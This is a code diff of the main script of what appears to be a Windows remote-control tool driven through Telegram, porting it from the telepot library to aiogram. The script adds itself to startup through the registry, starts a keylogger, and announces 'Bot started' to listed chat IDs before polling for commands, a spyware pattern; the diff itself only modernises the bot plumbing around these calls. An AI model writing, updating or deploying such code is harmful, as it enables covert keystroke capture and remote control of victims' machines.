@@ -2,9 +2,12 @@ import os
 import sys
 import time
 import winreg
+import asyncio
 
-from telepot.loop import MessageLoop
-from config import bot, KNOWN_IDS
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+from aiogram.types import Message
+from config import TOKEN, KNOWN_IDS
 from handlers import handle_message, send_safe_message
 from loggers import setup_logging, start_keylogger
 
@@ -35,19 +38,24 @@ def add_to_startup():
         pass
 
 
-if __name__ == '__main__':
+async def main():
     add_to_startup()
 
     setup_logging()
     start_keylogger()
 
-    MessageLoop(bot, handle_message).run_as_thread()
+    bot = Bot(token=TOKEN)
+    dp = Dispatcher()
+
+    @dp.message()
+    async def handle_all_messages(message: Message):
+        await handle_message(message, bot)
 
     for chat_id in KNOWN_IDS:
-        send_safe_message(chat_id, "Бот запущен")
+        await send_safe_message(bot, chat_id, "Бот запущен")
 
-    while True:
-        time.sleep(10)
-
+    await dp.start_polling(bot)
 
 
+if __name__ == '__main__':
+    asyncio.run(main())
